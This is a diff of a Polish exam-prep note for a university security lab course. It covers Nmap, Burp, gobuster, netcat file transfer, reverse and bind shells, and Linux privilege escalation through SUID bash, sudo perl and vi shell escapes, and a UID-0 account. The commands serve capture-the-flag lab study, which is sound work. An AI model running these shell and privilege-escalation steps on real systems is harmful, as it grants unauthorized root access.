@@ -1,42 +1,29 @@
 ---
-title: "Kolokwium 1 - przygotowanie praktyczne według wskazówek"
-description: "Siedem obszarów kolokwium BSI: jak dobrać komendę, odczytać wynik i zdobyć flagę. Przykłady z prac domowych oraz skrót na A4."
+title: "Kolokwium 1 — praktyka i komendy"
+description: "Linux, Nmap, Burp, enumeracja, pobieranie plików, powłoki i eskalacja uprawnień. Komendy, odczyt wyników i skrót na A4."
 order: 13
 updated: 2026-11-16
 ---
 
-## Co wynika z nowych informacji
+## Kolokwium w skrócie
 
-Ta notatka jest przygotowana **pod przekazane wskazówki o kolokwium**, a nie jako kolejny pełny wykład. Najpierw poznajesz sposób myślenia i podstawowe komendy. Potem przechodzisz przez przykłady z własnych zadań, a na końcu masz krótkie ćwiczenia kontrolne i propozycję treści na kartkę A4.
+- **7 zadań**, podobnych do prac domowych, czasem rozszerzonych. **Minimum 25 do zaliczenia.**
+- Prawdopodobnie oddajesz **wartość flagi**, zamiast uruchamiać autosolver.
+- Najwięcej punktów i samodzielnej pracy: **zadanie 7 — SUID, sudo, linPEAS**. W raporcie najważniejsze są **Interesting Permissions** i **Users Information**.
+- Z zadania 5 przećwicz pobieranie plików; socat nie będzie potrzebny. W zadaniu 6 rozróżniaj swoją rolę w reverse i bind shellu. Złożony wariant 7.11 mało prawdopodobny.
 
-Z Twoich informacji wynika:
+**Materiały i organizacja:** blok 1 na stronie oraz własna, odręczna kartka maks. A4. Kartkę można wcześniej wysłać prowadzącej do sprawdzenia. PDF-y przygotuj na **Z:** — Teams będzie zamknięty. Własny laptop: maksymalna jasność i brak pomocy technicznej. Jeśli nie wiesz, czy błąd jest techniczny, zapytaj.
 
-- Będzie **7 zadań**, w formule podobnej do prac domowych, ewentualnie nieco rozwiniętych.
-- Próg zaliczenia zapisano jako **minimum 25**. Nie podano tutaj pełnej skali punktów ani rozkładu na zadania, więc nie zakładamy, jaki procent wyniku ani ile zadań to oznacza.
-- Najprawdopodobniej trzeba będzie **odczytać i wysłać flagę**, zamiast czekać na automatyczne zaliczenie. To nadal zapowiedź, nie gwarancja identycznej formy każdego zadania.
-- Wskazane materiały to **blok 1 na stronie** oraz własna notatka odręczna na maksymalnie jednej kartce A4. Prowadząca może ją sprawdzić; można wcześniej zapytać o akceptację jej treści. Nie zakładaj, że ta długa notatka będzie dozwolona do otwarcia podczas kolokwium.
-- PDF-y warto przygotować na dysku **Z:** zgodnie z poleceniem prowadzącej, bo Teams ma być zamknięty.
-- Na własnym laptopie ma być maksymalna jasność ekranu; według przekazanej informacji nie będzie wtedy pomocy technicznej.
-- Gdy nie wiesz, czy problem jest techniczny, warto zgłosić go i zapytać zamiast długo zgadywać.
+## Schemat rozwiązania zadania
 
-**Priorytety nauki:** najwięcej samodzielności i punktów ma wymagać obszar 7, szczególnie SUID, sudo oraz sekcje linPEAS dotyczące uprawnień i użytkowników. W obszarze 5 ćwicz pobieranie plików. W 6 rozpoznawanie własnej roli w reverse/bind shellu. Socat i scenariusz 7.11 nie są głównym kierunkiem tej powtórki.
+1. Ustal **cel**: znaleźć plik, odczytać odpowiedź, pobrać dane czy uzyskać odpowiednie uprawnienia?
+2. Sprawdź **miejsce wykonania**: Kali, maszyna pośrednia, cel czy klient FTP/SMB?
+3. Podstaw IP, port, ścieżkę i słownik **z bieżącego zadania**.
+4. Zweryfikuj wynik i odczytaj flagę. Wyślij samą wartość, bez promptu i dodatkowych spacji.
 
-## Zasada wspólna: od polecenia do flagi
+W komendach `ADRES`, `PORT`, `PLIK`, `KATALOG` i `SLOWNIK` to miejsca na wartości z zadania.
 
-W zadaniu praktycznym dobrze jest rozdzielić cztery rzeczy:
-
-1. **Co mam uzyskać?** Treść pliku, numer portu, odpowiedź HTTP, dostęp do konta czy flagę?
-2. **Gdzie mam działać?** Na Kali, maszynie pośredniej, docelowym serwerze, w Burpie czy wewnątrz klienta FTP/SMB?
-3. **Jakie dane już dostałem?** IP, port, protokół, ścieżkę, słownik, nazwę użytkownika, kierunek połączenia?
-4. **Co potwierdzi sukces?** Poprawny wynik, zapisany niepusty plik, właściwe `id`, widoczna flaga i jej przyjęcie przez platformę.
-
-Nie przywiązuj się do IP, nazw kont i flag z prac domowych. Na kolokwium podstawisz wartości z nowego zadania. W szablonach poniżej `ADRES`, `PORT`, `PLIK`, `KATALOG` i `SLOWNIK` oznaczają takie wartości, a nie tekst do wpisania dosłownie.
-
-**Flaga to dokładna wartość z zadania.** Skopiuj ją bez znaku zachęty terminala, komentarza, nagłówków i przypadkowych spacji. Nie zakładaj jej formatu, dopóki go nie zobaczysz. Samo wykonanie komendy, która wcześniej uruchamiała autosolver, może nie wystarczyć.
-
-## Część I. Zrozumienie i schematy działania
-
-### 1. Linux: wybierz komendę według pytania
+## 1. Linux: wybierz komendę według pytania
 
 Najważniejsze jest odróżnienie **szukania pliku**, **szukania tekstu w pliku** i **wyświetlenia zawartości**.
 
@@ -59,7 +46,7 @@ find /home -type f -iname '*flag*' 2>/dev/null
 grep -rni 'flag' /home/student 2>/dev/null
 ```
 
-Pierwsza linia szuka **nazw**, druga **treści**. Nie uruchamiaj obu bez zastanowienia: jeśli zadanie wskazuje konkretny katalog, rozpocznij od niego zamiast od całego `/`. To ogranicza szum i czas.
+Pierwsza linia szuka **nazw**, druga **treści**. Zacznij od katalogu wskazanego w zadaniu.
 
 `2>/dev/null` ukrywa błędy, np. brak dostępu; nie nadaje prawa odczytu. Jeśli wynik jest pusty, przy diagnozie powtórz bez ukrywania błędów. `locate` może być szybkie, ale korzysta z indeksu, więc nie jest najlepszym jedynym sprawdzeniem dla świeżo dodanych plików.
 
@@ -69,9 +56,9 @@ Po znalezieniu ścieżki dopiero odczytaj plik:
 cat '/home/student/katalog z nazwa/flag.txt'
 ```
 
-Przy okazji rozpoznawaj: `id` pokazuje konto i uprawnienia, `who` sesje użytkowników, `ps aux` procesy, `ip a` adresy, `ip r` trasy. Przy plikach `>` nadpisuje, a `>>` dopisuje. `|` przekazuje wyjście jednego programu na wejście następnego.
+**Dodatkowo:** `id` pokazuje konto i uprawnienia, `who` sesje użytkowników, `ps aux` procesy, `ip a` adresy, `ip r` trasy. Przy plikach `>` nadpisuje, a `>>` dopisuje. `|` przekazuje wyjście jednego programu na wejście następnego.
 
-### 2. Nmap: przeczytaj raport, nie tylko uruchom skan
+## 2. Nmap: przeczytaj raport, nie tylko uruchom skan
 
 Enumeracja sieci odpowiada kolejno na pytania: **jaki host, jaki port, jaka usługa, jaka wersja i co z niej wynika?**
 
@@ -81,11 +68,11 @@ PORT      STATE SERVICE VERSION
 8080/tcp  open  http    nginx ...
 ```
 
-To przykład dydaktyczny, nie wynik nowego zadania. Numer portu to **23** lub **8080**, a `/tcp` określa protokół transportowy. `open` to stan portu. `ssh` i `http` opisują usługę; ostatnia część opisuje rozpoznaną implementację lub wersję.
+Numer portu to **23** lub **8080**, a `/tcp` określa protokół transportowy. `open` to stan portu. `ssh` i `http` opisują usługę; ostatnia część opisuje rozpoznaną implementację lub wersję.
 
 **SSH na porcie 23 nadal jest SSH.** Gdy raport rozpoznaje HTTP na 8080, w adresie curl trzeba użyć `http://ADRES:8080/`. Przy SSH użyjesz `ssh UZYTKOWNIK@ADRES -p 23`.
 
-Zapamiętaj podstawowe opcje jako osobne funkcje:
+**Najważniejsze opcje:**
 
 - `-sn` - odkrywa hosty bez skanowania ich portów.
 - `-sT` - skan TCP connect.
@@ -98,7 +85,7 @@ Zapamiętaj podstawowe opcje jako osobne funkcje:
 - `-Pn` - pomiń wstępne sprawdzanie aktywności hosta i spróbuj skanu.
 - `-A` - zestaw rozszerzonych funkcji, w tym wersje, OS, domyślne skrypty i traceroute; nie oznacza wszystkich portów.
 
-Nie trzeba w każdym zadaniu uruchamiać wszystkiego. Jeśli masz znaleźć usługę na podanym hoście, sensownym początkiem w laboratorium jest:
+**Rozpoznanie usług na podanym hoście:**
 
 ```bash
 nmap -sV ADRES
@@ -114,9 +101,9 @@ Jeżeli potrzebujesz informacji ze skryptów, dołącz `-sC`. Gdy pojawia się �
 
 `closed` oznacza odpowiedź wskazującą brak nasłuchu, a `filtered` brak możliwości rozstrzygnięcia wskutek filtrowania lub braku odpowiednich odpowiedzi. **Otwarty port nie jest automatycznie luką.** To wskazówka, jaką usługę sprawdzić dalej.
 
-### 3. Burp Suite: które narzędzie do którego zadania?
+## 3. Burp Suite: które narzędzie do którego zadania?
 
-Zapamiętaj pięć skojarzeń:
+**Wybór narzędzia:**
 
 - **HTTP history = obejrzyj to, co już przesłano.** Żądania, odpowiedzi, nagłówki i przekierowania.
 - **Intercept = zatrzymaj przed wysłaniem.** Zmień parametr i wybierz Forward.
@@ -124,7 +111,7 @@ Zapamiętaj pięć skojarzeń:
 - **Intruder = wykonaj serię prób.** Kolejne identyfikatory lub wiele takich samych żądań.
 - **Decoder = odkoduj reprezentację.** Na przykład Base64; nie jest to łamanie szyfrowania.
 
-Ruch musi przechodzić przez Burpa. Najprościej przećwiczyć to w jego wbudowanej przeglądarce. Jeśli nic nie ma w historii, najpierw sprawdź przeglądarkę i proxy, zamiast szukać flagi w pustej zakładce.
+Otwórz stronę we wbudowanej przeglądarce Burpa. Brak ruchu w historii → sprawdź, czy używasz właściwej przeglądarki i proxy.
 
 W odpowiednim wpisie rozróżniaj **Request** i **Response**. Parametr, metoda i Cookie wysyłane są w żądaniu; flaga może być w treści **lub nagłówku odpowiedzi**. Jeśli przeglądarka od razu przekierowuje na login, obejrzyj wcześniejszą odpowiedź w historii.
 
@@ -132,9 +119,9 @@ W Intruderze zaznacz tylko zmieniany fragment. Przykładowo w `/usersdata/4/` wy
 
 Jeśli przeglądarka „stoi”, sprawdź, czy Intercept nie zatrzymał ruchu. Po potrzebnej modyfikacji wyłącz go, gdy nie jest już używany.
 
-### 4. Enumeracja WWW: znajdź miejsce podstawienia
+## 4. Enumeracja WWW: znajdź miejsce podstawienia
 
-Według wskazówki dostaniesz informację, **po czym enumerować** oraz odpowiedni kontekst słownika. Twoim zadaniem będzie dopasować tryb i adres, nie zgadywać całą bazę słów.
+**Dostaniesz cel enumeracji i słownik.** Dobierz tryb do miejsca, w którym mają być podstawiane słowa:
 
 - **Katalogi lub pliki:** zmieniasz ścieżkę za hostem → `gobuster dir`.
 - **Wirtualne hosty:** zmieniasz nazwę obsługiwaną przez serwer → `gobuster vhost`.
@@ -154,9 +141,9 @@ Wirtualny host to nie podfolder. `http://beta.developer/` i `http://developer/be
 
 Po skanie **odwiedź znaleziony zasób i sprawdź odpowiedź**, zamiast traktować sam wpis w raporcie jako flagę. Przekierowanie lub `403` też może być ważnym tropem. Jeśli wszystkie losowe adresy zwracają to samo, porównaj długość i treść odpowiedzi dla nieistniejącego zasobu. Nie przepisuj filtra rozmiaru z innej instancji bez sprawdzenia.
 
-### 5. Pobranie pliku: ustal protokół i kierunek połączenia
+## 5. Pobranie pliku: ustal protokół i kierunek połączenia
 
-„Pobierz plik” nie wskazuje jednej komendy. Najpierw przeczytaj, **jak serwer go udostępnia**.
+Dobierz komendę do **protokołu i kierunku połączenia**.
 
 **Zwykły adres HTTP/HTTPS:**
 
@@ -200,7 +187,7 @@ cat pobrane.txt
 
 **Uwaga o `>`:** plik może zostać utworzony lub wyzerowany, zanim połączenie się powiedzie. Samo istnienie pliku nie potwierdza pobrania. Nie nadpisuj jedynej dobrej kopii kolejną próbą bez potrzeby.
 
-### 6. Powłoki: rozpoznaj swoją stronę
+## 6. Powłoki: rozpoznaj swoją stronę
 
 Zawsze odpowiedz na trzy pytania: **gdzie działa Bash, kto nasłuchuje, kto się łączy?** W obu wariantach omawianych na zajęciach powłoka działa na celu.
 
@@ -236,9 +223,9 @@ Samo połączenie `nc` może dać tylko kanał tekstowy, bez powłoki. Sprawdź 
 
 Przy reverse shellu cel musi znać dostępny dla niego adres pentestera. W laboratorium będzie to zwykle adres VPN z `ip addr show tun0`, pole `inet`, a nie adres `peer` ani automatycznie adres Wi-Fi. Najpierw uruchom nasłuch, potem stronę łączącą.
 
-### 7. SUID, sudo i linPEAS: najważniejsza samodzielna część
+## 7. SUID, sudo i linPEAS: najważniejsza samodzielna część
 
-Tu potrzebujesz rozumowania: **co znalazłem, jakie to daje uprawnienie i jak sprawdzić, czy rzeczywiście mogę z niego skorzystać?**
+**Cel: znaleźć możliwość wykonania wymaganej czynności z wyższymi uprawnieniami, potwierdzić je i odczytać flagę.**
 
 Początek na docelowym systemie:
 
@@ -250,6 +237,8 @@ sudo -l
 ```
 
 `id` mówi, jakie masz prawa teraz. `ls -la` może pokazać ukryty plik i jego uprawnienia. `sudo -l` pokazuje dostępne reguły. Jeśli sudo pyta o hasło, zwykle chodzi o hasło bieżącego użytkownika; nie zgaduj hasła roota. Sposób uwierzytelniania może zależeć od konfiguracji zadania.
+
+### SUID: właściciel, prawa i sposób uruchomienia
 
 **Jak czytać uprawnienia:** w `-rwsr-xr-x` znak `s` w części właściciela sygnalizuje SUID. Właściciela odczytujesz w dalszych kolumnach `ls -l`. SUID może ustawić efektywny UID właściciela pliku przy uruchomieniu; dla pliku należącego do root może to oznaczać efektywny UID 0. Sam SUID nie oznacza, że każdy plik jest furtką.
 
@@ -269,7 +258,9 @@ Obejrzyj podejrzaną ścieżkę przez `ls -l /sciezka/pliku`. Nietypowe położe
 
 **Szczególny przypadek Bash:** w zadaniu 7.6 powłoka z odpowiednim SUID wymagała `bash -p`, aby zachować efektywne uprawnienia. Zwykłe uruchomienie mogło je odrzucić. Jednak samo `bash -p` na normalnym pliku nie daje roota. Używaj ścieżki do faktycznie zidentyfikowanego programu, a wynik sprawdzaj przez `id` - może pokazać `euid=0`, nawet gdy rzeczywisty `uid` pozostaje użytkownika.
 
-**Jak czytać sudo:** przykładowy, dydaktyczny wpis:
+### sudo: jaki program wolno uruchomić i jako kto?
+
+Przykładowy wynik `sudo -l`:
 
 ```text
 (root) NOPASSWD: /usr/bin/vi
@@ -279,7 +270,7 @@ Oznacza możliwość wykonania wskazanego programu jako root bez hasła w ramach
 
 **GTFOBins** pomaga sprawdzić, czy funkcje konkretnego programu mogą być wykorzystane w warunkach sudo lub SUID. Dobierz właściwy wariant uprawnień. Opis dla sudo nie jest automatycznie przepisem dla zwykłego uruchomienia bez sudo.
 
-### 7. Ciąg dalszy: jak nie zgubić się w linPEAS
+### linPEAS: znajdź trop i sprawdź go
 
 Jeżeli skrypt jest dostępny w katalogu, uruchom go i zachowaj wynik:
 
@@ -288,11 +279,11 @@ bash linpeas.sh | tee linpeas-wynik.txt
 less -R linpeas-wynik.txt
 ```
 
-`tee` zapisuje standardowe wyjście i jednocześnie je pokazuje. `less -R` pomaga oglądać wynik z kolorami. To lokalna pomoc do przeglądania, nie dodatkowa metoda eskalacji. Jeśli coś nie zostało zapisane, komunikat mógł trafić na stderr.
+`tee` zapisuje standardowe wyjście i jednocześnie je pokazuje. `less -R` pomaga oglądać wynik z kolorami. Jeśli coś nie zostało zapisane, komunikat mógł trafić na stderr.
 
 W `less` wpisz `/szukany_tekst`, potem Enter. `n` przechodzi do następnego dopasowania, `N` do poprzedniego, `q` kończy przeglądanie. Wyszukiwanie jest tekstowe; nazwy nagłówków zależą od wersji skryptu.
 
-Według wskazówki prowadzącej najpierw znajdź dwie grupy informacji:
+Najpierw przejrzyj dwie sekcje:
 
 **Interesting Permissions / interesujące uprawnienia:**
 
@@ -320,217 +311,45 @@ Kolejność pól to `nazwa:haslo:UID:GID:opis:dom:powloka`. `x` zwykle oznacza o
 
 **Cel końcowy:** uzyskaj wymagany kontekst, potwierdź `id`, odczytaj flagę z lokalizacji podanej w zadaniu i wyślij jej wartość. `/root/solve` znane z prac domowych nie jest standardową komendą Linuxa ani gwarantowanym sposobem oddania kolokwium.
 
-## Część II. Te same mechanizmy w Twoich pracach domowych
+### Przykłady sudo i kont z prac domowych
 
-Poniższe adresy i nazwy pochodzą z Twoich rozwiązań. Służą do powtórzenia konkretnych laboratoriów. Na kolokwium zastępujesz je wartościami z treści zadania.
-
-### 1. Zadania 1.10, 1.12 i 1.13: ukryty plik, nazwa i zawartość
-
-W **1.10** kluczowe było znalezienie pliku pomijanego przez zwykłe `ls`:
-
-```bash
-ls -a
-cat .secret
-```
-
-W **1.12** najpierw szukałeś nazwy, potem czytałeś znalezioną ścieżkę:
-
-```bash
-locate FINDME
-cat /opt/FINDME
-```
-
-Jeśli indeks nie pokazuje świeżego pliku, odpowiednikiem sprawdzenia nazwy jest `find /opt -type f -name 'FINDME'`. W **1.13** znałeś nazwę pliku, a szukałeś konkretnej treści:
-
-```bash
-grep solution WORDS
-```
-
-**Możliwe rozwinięcie do przećwiczenia:** dostajesz katalog, ale nie nazwę pliku z odpowiedzią. Najpierw przejrzyj zawartość, potem użyj `find` dla wskazówki o nazwie albo `grep -rn` dla wskazówki o treści. To wariant treningowy, nie zapowiedź dokładnego zadania.
-
-### 2. Zadania 2.4-2.7 i 2.2p: skan prowadzi do konkretnej usługi
-
-W **2.4** odkrywałeś hosty:
-
-```bash
-nmap -sn 10.13.37.0/24
-```
-
-Następnie na znalezionym adresie sprawdzałeś port, wersję oraz informacje skryptów. Szablon po podstawieniu celu:
-
-```bash
-nmap -sT ADRES
-nmap -sV ADRES
-nmap -sC -sV ADRES
-```
-
-W **2.2p** rozwiązanie wymagało pamiętania o porcie HTTP 8080:
-
-```bash
-curl http://192.168.200.152:8080/flag2.2p.txt
-```
-
-**Wniosek:** skan dostarcza adresu usługi do następnego kroku. Jeśli podasz samo IP bez `:8080`, sprawdzisz inną usługę lub port bez nasłuchu. W części prac domowych skany wewnętrzne trzeba było wykonywać po SSH na maszynie pośredniej.
-
-### 3. Zadania 3.1-3.5 i 3.3p: wybór modułu Burpa
-
-Powtórz praktycznie poniższy ciąg we własnym laboratorium:
-
-1. **3.1:** otwórz stronę `http://192.168.100.103/`, znajdź żądanie do `/` w historii i odczytaj nagłówek **Response** `FLAG_3_1`.
-2. **3.2:** zatrzymaj właściwe żądanie POST w **Intercept**, zmień `solve=0` na `solve=1`, kliknij Forward.
-3. **3.3:** wyślij żądanie `vote=YES` do **Repeatera** i powtórz je ręcznie.
-4. **3.4:** wyślij żądanie do **Intrudera**, ustaw Null payloads i liczbę powtórzeń.
-5. **3.5:** odkoduj dane ze strony `/encoded/` w **Decoderze** jako Base64.
-
-W **3.3p** użyłeś Numbers 1-50, aby przejść po `/usersdata/ID/`. W rozwiązaniu Hacker miał ID 48, ale w nowym zadaniu nie zakładaj tej liczby. Porównuj rzeczywiste odpowiedzi.
-
-Warianty PDF i repozytorium różniły się nazwami ciasteczek, parametrami i wartością głosu. Ćwicz na rzeczywistym żądaniu, nie na samym zapamiętanym napisie.
-
-### 4. Zadania 4.1, 4.2, 4.4 i 4.5: cztery miejsca enumeracji
-
-**4.1 - katalogi na stronie głównej:**
-
-```bash
-gobuster dir -u http://192.168.100.104/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -r
-```
-
-**4.2 - pliki w konkretnym katalogu:**
-
-```bash
-gobuster dir -u http://192.168.100.104/misc/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
-```
-
-**4.4 - nazwy z dopisaną domeną:**
-
-```bash
-gobuster vhost -u http://192.168.100.104/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain channel --append-domain
-```
-
-**4.5 - wartość parametru:**
-
-```bash
-gobuster fuzz -u 'http://192.168.100.104/4.5.php?password=FUZZ' -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --exclude-length 334
-```
-
-`334` jest filtrem z zapisanej instancji, a nie uniwersalną wartością. Podczas nauki wskaż palcem, **który fragment żądania zmienia każde polecenie**. Jeśli umiesz to zrobić, łatwiej dostosujesz szablon do podanego słownika i nowej ścieżki.
-
-### 5. Zadania 5.1, 5.3 i 5.5: trzy sposoby pobrania
-
-**5.1: Ty inicjujesz TCP i zapisujesz odebrane bajty.**
-
-```bash
-nc 192.168.100.105 12301 > tcpconnect.png
-```
-
-**5.3: używasz UDP; echo wysyła początkowe dane, aby serwer mógł odpowiedzieć.**
-
-```bash
-echo | nc -u 192.168.100.105 12302 -w 5 > udpconnect.png
-```
-
-**5.5: Ty nasłuchujesz, a maszyna zadaniowa przychodzi z plikiem.**
-
-```bash
-nc -lvp 12303 > tcplisten.png
-```
-
-W **5.3p** pobierałeś zasoby WWW przez:
-
-```bash
-wget -r --no-parent http://192.168.200.155/
-```
-
-To pobieranie rekursywne odnajdywanych zasobów. Jeśli na kolokwium podano jeden konkretny plik, zwykle nie trzeba pobierać całego drzewa. W każdym przypadku rozpoznaj transport i kierunek połączenia. Socat nie jest potrzebny do tych przykładów.
-
-### 6. Zadania 6.2 i 6.6: tylko rola pentestera
-
-W **6.2**, reverse shell, po stronie Kali wykonywałeś:
-
-```bash
-nc -lvp 12302
-```
-
-To cel uruchamiał swoje `nc ... -e /bin/bash` i łączył się do Twojego VPN IP. Jeśli na kolokwium obsługujesz tylko pentestera, nie musisz sam konfigurować drugiej strony, o ile treść zadania jej nie wymaga.
-
-W **6.6**, bind shell, po stronie Kali wykonywałeś:
-
-```bash
-nc 192.168.100.106 32102
-```
-
-Cel miał już nasłuch z podłączonym Bashem. Po połączeniu komendy kierowałeś do celu. **To role sieciowe rozstrzygają nazwę techniki, nie kolejność numerów zadań ani obecność samego słowa Bash.**
-
-### 7. Zadania 7.4-7.6: znajdź i zrozum SUID
-
-W **7.4** podejrzanym plikiem w katalogu domowym była ukryta binarka `.zsh_history`. Nazwa wyglądała jak plik historii, ale rzeczywisty typ i uprawnienia miały większe znaczenie niż nazwa:
-
-```bash
-ls -la
-```
-
-W **7.5** szukałeś w całym systemie:
-
-```bash
-find / -type f -perm /6000 2>/dev/null
-```
-
-W zapisanym rozwiązaniu furtką był `/usr/sbin/delete`. Nie wynika z tego, że każdy program o takiej nazwie ma identyczne działanie.
-
-W **7.6** rozwiązaniem był Bash z właściwym SUID:
-
-```bash
-bash -p
-id
-```
-
-**Ćwiczenie do wykonania:** dla każdej z tych trzech maszyn zapisz: ścieżkę podejrzanego pliku, właściciela, widoczne prawa, wynik `id` przed i po wykorzystaniu. Jeśli potrafisz to wyjaśnić, rozumiesz rozwiązanie zamiast pamiętać jedną komendę.
-
-### 7. Zadania 7.8 i 7.9: sudo do interpretera albo edytora
-
-W **7.8** najpierw sprawdzałeś regułę, a następnie używałeś dopuszczonego Perla:
+**Interpreter dopuszczony przez sudo — zadanie 7.8:**
 
 ```bash
 sudo -l
 sudo /usr/bin/perl -e 'system("/root/solve");'
 ```
 
-Ten przykład pokazuje możliwość wykonania programu poprzez interpreter uruchomiony jako root. `/root/solve` był celem laboratoryjnym. W nowym zadaniu może być potrzebna inna czynność, np. odczyt konkretnej flagi; nie przepisuj końcówki bez przeczytania polecenia.
+`/root/solve` to program z pracy domowej. Na kolokwium wykonaj czynność wskazaną w poleceniu — np. odczytaj plik z flagą. Reguła musi dopuszczać konkretny interpreter i użyte argumenty.
 
-W **7.9** najpierw w zwykłej powłoce:
+**Edytor dopuszczony przez sudo — zadanie 7.9:**
 
 ```bash
 sudo -l
 sudo vi
 ```
 
-Potem **wewnątrz vi**, jako polecenie edytora:
+Wewnątrz edytora wpisz:
 
 ```text
 :!bash
 ```
 
-Następnie w uzyskanej powłoce sprawdzasz `id` i wykonujesz czynność wymaganą w zadaniu. `:!bash` nie wpisujesz jako zwykłego polecenia w terminalu przed otwarciem vi.
+W uzyskanej powłoce sprawdź `id`. Polecenie `:!bash` wpisujesz w vi, nie w zwykłym terminalu. Możliwość uruchamiania komend może być ograniczona przez regułę sudo.
 
-### 7. Zadanie 7.10: informacje o użytkownikach
+**Inne konto z UID 0 — zadanie 7.10:**
 
 ```bash
 cat /etc/passwd
-```
-
-W Twoim wariancie ważne było konto `backup` z UID 0 i pustym polem hasła. Następnie:
-
-```bash
 su backup
 id
 ```
 
-**Wniosek:** nie szukaj wyłącznie konta nazwanego `root`. Sprawdzaj numery UID i rzeczywiste zasady dostępu. Nie zakładaj też, że puste pole zawsze ominie uwierzytelnianie w dowolnym systemie.
+W pracy domowej konto `backup` miało UID 0 i puste pole hasła. Sprawdzaj pola rekordu i wynik `id`, nie tylko nazwę konta. Puste pole hasła nie gwarantuje logowania w każdej konfiguracji.
 
-Scenariusza **7.11 z nadpisywaniem `/etc/passwd` nie rozwijamy w tej notatce**, zgodnie z nową wskazówką. W pierwszej kolejności opanuj powyższe prostsze przypadki oraz nawigowanie po wyniku linPEAS.
+## Jak szybko znaleźć opcję w dokumentacji
 
-## Część III. Jak szukać brakującej opcji w dokumentacji
-
-Nie musisz pamiętać każdej flagi. Musisz umieć szybko znaleźć **opcję programu**, nie pomylić jej z **flagą zadania do oddania** i rozpoznać, do czego służy.
+**Nie pamiętasz opcji? Sprawdź pomoc konkretnego programu i trybu.**
 
 ### Pomoc programu, pomoc trybu, a potem man
 
@@ -565,13 +384,9 @@ Nie przenoś tej opcji mechanicznie do `wget`, w którym `-o` oznacza log. Czyta
 
 Nie przeglądaj całej dokumentacji od początku. Jeśli treść mówi „pliki w katalogu”, zacznij od `gobuster dir --help` i poszukaj URL oraz wordlist. Jeśli mówi o parametrze, wybierz pomoc `fuzz` i sprawdź użycie `FUZZ`.
 
-Lokalna dokumentacja nie wymaga otwierania Teams. To, z jakich źródeł wolno korzystać w trakcie kolokwium, nadal wynika z zasad prowadzącej. Nie zakładaj dostępności Internetu ani zewnętrznych stron z gotowymi rozwiązaniami.
+Wyszukiwanie w lokalnym `man` działa bez Internetu.
 
-## Część IV. Krótka próba przed kolokwium
-
-Poniższe zadania są treningiem ułożonym na podstawie wskazówek. Nie są prawdziwymi pytaniami ani potwierdzonym rozkładem punktów. Przećwicz je na przygotowanym laboratorium, a przed podglądem odpowiedzi powiedz własnymi słowami, co robisz.
-
-### Siedem scenariuszy do sprawdzenia
+## Sprawdź się: siedem zadań treningowych
 
 1. W podanym katalogu istnieje plik o nieznanej nazwie. W treści zawiera słowo `solution`. Znajdź go i odczytaj odpowiedź.
 2. Dostajesz wynik Nmap z SSH na 2222 i HTTP na 8080. Wskaż porty i przygotuj po jednej komendzie dostępu.
@@ -594,7 +409,7 @@ Poniższe zadania są treningiem ułożonym na podstawie wskazówek. Nie są pra
 
 </details>
 
-### Co zrobić, gdy coś nie działa
+## Gdy coś nie działa
 
 Zamiast losowo zmieniać opcje, sprawdź po kolei:
 
@@ -606,11 +421,11 @@ Zamiast losowo zmieniać opcje, sprawdź po kolei:
 6. Czy komunikat oznacza błąd składni, brak opcji w tej wersji, brak uprawnień, odmowę połączenia czy timeout?
 7. Czy rezultat rzeczywiście jest flagą, a nie komunikatem błędu albo samym sukcesem narzędzia?
 
-Przy zgłoszeniu podaj **zadanie, miejsce wykonania, komendę i dokładny komunikat**. Zgodnie ze wskazówką warto zapytać, czy problem jest techniczny. Brak wyniku po jednej próbie nie rozstrzyga przyczyny.
+Jeśli problem pozostaje, zgłoś **numer zadania, maszynę, komendę i dokładny komunikat błędu**.
 
-## Propozycja skrótu do przepisania na A4
+## Skrót na odręczną kartkę A4
 
-To materiał do **ręcznego skrócenia i przepisania**, nie potwierdzenie akceptacji kartki przez prowadzącą. Miejsce zależy od pisma i układu; najpierw sprawdź, ile się mieści, i usuń rzeczy, które już pamiętasz. Najwięcej miejsca zostaw na obszar 7 oraz te opcje, które najłatwiej mylisz.
+Najwięcej miejsca zostaw na SUID, sudo i linPEAS. Usuń z poniższego skrótu komendy, które już pamiętasz; kartkę możesz wcześniej dać prowadzącej do akceptacji.
 
 ```text
 ZASADA: CEL -> GDZIE DZIALAM -> KOMENDA -> WYNIK -> FLAGA
@@ -676,12 +491,8 @@ man/less: /slowo, Enter, n/N, q
 output, listen, ports, recursive, wordlist, perm, iname
 ```
 
-## Jak korzystać z pozostałych notatek
+## Więcej przykładów
 
-Ten plik jest celowo węższy niż pełne przygotowanie. W tym samym folderze masz:
-
-- `bsi-rozwiazania.md` - dokładne sekwencje 101 zadań i uwagi o różnicach instancji.
-- `bsi-spis-komend.md` - szerszy słownik poleceń i opcji.
-- `bsi-kolokwium-1.md` - pełną teorię z 14 PDF-ów.
-
-Podstawą nowego zakresu są Twoje informacje o kolokwium. Przykłady praktyczne pochodzą z wcześniejszego opracowania i plików [repozytorium BSI](https://github.com/M1CH4L9/BSI), zwłaszcza zadań 1.10-1.13, 2.4-2.7, 2.2p, 3.1-3.5, 3.3p, 4.1-4.5, 5.1-5.5, 6.2, 6.6 oraz 7.4-7.10. Dodatkowe scenariusze kontrolne i skrót A4 są materiałem treningowym. Nie uruchamiano tych poleceń na maszynach BSI ani nie odtwarzano przyszłego kolokwium.
+- [Rozwiązania prac domowych](/przedmioty/bsi/bsi-rozwiazania/) — konkretne zadania i sekwencje komend.
+- [Spis komend](/przedmioty/bsi/bsi-spis-komend/) — opcje narzędzi.
+- [Pełna powtórka do kolokwium 1](/przedmioty/bsi/bsi-kolokwium-1/) — szersze wyjaśnienia materiału 1–7.
